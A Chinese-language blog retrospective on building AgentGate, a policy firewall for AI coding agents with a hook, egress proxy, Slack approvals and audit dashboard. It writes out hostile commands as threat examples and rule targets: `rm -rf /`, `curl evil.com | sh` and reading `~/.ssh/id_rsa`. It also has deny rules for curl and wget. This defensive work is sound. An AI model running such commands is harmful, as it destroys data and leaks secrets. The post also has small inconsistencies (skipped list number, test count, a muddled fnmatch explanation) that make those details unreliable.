# 5 天从零做一个 AI Agent 防火墙：AgentGate 复盘

> 5 天从立项到 PyPI-ready，48 测试通过，端到端验证。讲讲我做了什么、踩了什么坑、为什么这样做。

---

## 立项：什么是「Agent 防火墙」

2026 年写代码的人是 AI 写 80%，人写 20%。但**安全姿态还停在 1990 年代**：

- agent 能 `rm -rf /` 不需要确认
- agent 能 `curl evil.com | sh` 你拦不住
- agent 能读 `~/.ssh/id_rsa` 你事后才发现
- agent 跑完了你看不出**它到底做了什么**

2025 年开始 GitHub 上冒出一批「agent sandbox」项目（agentjail 73⭐、Armorer 60⭐、ryk 36⭐、avakill 12⭐）。我把它们全 clone 下来读完，**没有一家解决了完整三件套**：

1. **工具调用拦截**（Bash / Read / Write）
2. **网络出口拦截**（curl / WebFetch）
4. **人类介入闭环**（人类点 Allow / Deny）

加上分散在不同 `.claude/settings.json` 里的策略无法统一审计 —— 团队规模下基本没人能回答「上周这个 agent 到底发出去过什么请求」。

**AgentGate = 这三件套 + 一个 SQLite + 一个 HTML dashboard。**

---

## Day 1：策略 DSL + SQLite 审计

第一天定 YAML 格式，因为：

- 团队可以 git diff 审计策略变化
- 非工程师（合规、PM）能读懂
- 静态检查 + lint 都白送

```yaml
version: 1
default: allow
rules:
  - id: deny-rm-rf
    match: { tool: Bash, command: "rm -rf /*" }
    action: deny
    reason: "Mass deletion outside repo"
  - id: ask-outbound
    match: { tool: Bash, command: "~\\bcurl\\b|\\bwget\\b" }
    action: ask
```

匹配用了三层：`exact` → `fnmatch`（`*` 跨 `/`，跟 gitignore 一致）→ `~regex~`（前缀 `~` 切到正则）。`~` 这个前缀是借 Vim 的 `~=` 习惯 —— 用户不用学新语法。

审计用 SQLite 因为：

- 单文件，agent 跑完打包发出去就行
- SQL 写「过去 24h deny 了多少次」「top 10 被拦的命令」非常容易
- 无需部署

Day 1 收尾：48 个测试全过（后来加到 48）。

---

## Day 2：Claude Code Hook

Claude Code 的 hook 系统读 JSON from stdin，回 JSON to stdout。我把 hook 设计成 fail-open（缺配置就放行）—— **永远不让 agent 因为我的 bug 而瘫掉**。

`permissionDecision` 字段三选一：`allow | deny | ask`。如果是 `ask`，hook 会阻塞等到 Slack 那边点链接。

⚠️ **踩坑 #1**：fnmatch 的 `*` 不跨 `/`。`"rm -rf /*"` 匹配不上 `"rm -rf /etc"`。修法：用 `fnmatch.translate()` 生成正则，新 glob `"rm -rf /etc"` 能命中 `"rm -rf /etc/passwd"`。这个 bug 我测了 3 轮才发现。

---

## Day 3：网络出口拦截

mitmproxy 是 Python 生态里现成的代理。我写了 80 行 add-on：

```python
def request(self, flow):
    decision = evaluate_network(flow.request.url, self.policy.network)
    if decision.action == "deny":
        flow.response = Response.make(
            403, f"AgentGate: DENY — {decision.reason}".encode(),
            {"Content-Type": "text/plain"}
        )
```

**端到端真跑过**：`curl --proxy http://localhost:8080 evil.com/` 真返回 403 + body「AgentGate: DENY」。

⚠️ **踩坑 #2**：mitmproxy 的 `Response` 构造函数在新版本改了 API，我用旧写法直接报 `TypeError`。修法：`from mitmproxy.http import Response; Response.make(...)`。

---

## Day 4：Slack 人类介入

设计成两进程：

- **hook 进程**：写 SQLite `approvals` 表 + 等通知
- **HTTP server 进程**：收 `/approve/<token>?d=allow` → 写 SQLite

⚠️ **踩坑 #3**：跨进程共享状态。最初我用 Python 模块级单例 `STORE` —— hook 进程和 server 进程的 STORE 是不同的内存对象，server 写了之后 hook 看不到。

**修法**：SQLite 做 cross-process state。Hook 不只 `wait()` 内存 Condition，每 200ms 也读 SQLite。

```python
def wait(self, token, timeout):
    ask = self._pending.get(token)
    if not ask:
        return self._poll_until_resolved(token, timeout)
    ...
```

实测：hook 等 12 秒，server 收到 curl 后 5 毫秒写 SQLite，hook 200ms 内唤醒 → 返回 allow。**这就是 AgentGate 的真实端到端流程。**

Slack Block Kit 生成只用了 50 行：标题 + 命令 + 工具 + Allow / Deny 链接。无 Slack 时 fallback 写 `/tmp/agentgate-asks.jsonl` —— 我自己测试就用的这个文件。

---

## Day 5：Dashboard + 上 PyPI

Dashboard 是 14 KB 单 HTML，无前端框架、无构建步骤、无 CDN：

- 4 张卡片（total / allow / deny / ask）
- 24 小时 SVG 柱状图
- Top denied rules 横向 bar
- 最近 30 条事件表

```js
setInterval(fetchAll, 5000);  // 5 秒轮询
```

审美不是重点，能用就行。

PyPI 上传走 `uv publish`，需要：

- 完整 `pyproject.toml`（[project.urls] + classifiers + license）
- `LICENSE` 文件（Apache 2.0）
- `py.typed` marker（PEP 561）
- `readme = "README.md"` 让 PyPI 渲染

---

## 端到端 verify 脚本

最有价值的一行：`bash scripts/verify.sh`，6 步全跑通：

```
✓ pytest (48 passed)
✓ cli eval (allow + deny)
✓ dashboard (HTML + /api/stats)
✓ approval server (resolved allow)
✓ network proxy (200 allow + 403 deny)
✓ hook install + deny (real Claude Code protocol output)
```

任何人在自己机器 clone 下来都能 60 秒验完。

---

## 数字

- **LOC**: 1100 (Python) + 200 (测试) + 50 (脚本)
- **依赖**: click, mitmproxy, pyyaml, rich — 没有 npm 依赖
- **测试**: 48 个，~6 秒跑完
- **CI**: GitHub Actions，Py 3.12 + 3.13
- **Releases**: v0.1.0 + v0.1.1
- **Issue**: Roadmap 开放，欢迎投票下一步

---

## 我学到的

1. **跨进程状态用 SQLite 比 shared memory 简单一百倍**。lock + table + polling 200ms 就够了。
2. **fail-open 是 Agent 安全工具的底线**。你的 hook 永远不能比 agent 自己更脆弱 —— 否则用户会绕过你的工具。
3. **5 天 MVP 关键是「每天一个可演示的东西」**。Day 1 的 CLI + Day 2 的 hook + Day 3 的代理 + Day 4 的审批 + Day 5 的 dashboard，每天都能在 Twitter / Discord 秀一点。
4. **测试替我抓了 11 个 bug**。其中 4 个是 fnmatch glob 边界 —— 没有测试我自己复测根本发现不了。
5. **写博客比写代码费时**（当然）。

---

## 下一步

按价值 / 难度排序：

| | |
|---|---|
| **A** | Cursor 适配器（Cursor 的权限 API 类似 PreToolUse）|
| **B** | Telegram notification（用户偏好 Telegram）|
| **C** | 团队模式：hosted policy + 集中审计 |
| **D** | eBPF 网络拦截（取代 mitmproxy，无需 `HTTP_PROXY` env）|

投票：[GitHub Issue #1](https://github.com/FelixMa01/agentgate/issues/1)

---

**项目地址**：https://github.com/FelixMa01/agentgate

**License**: Apache 2.0

— Felix @ 2026-08-14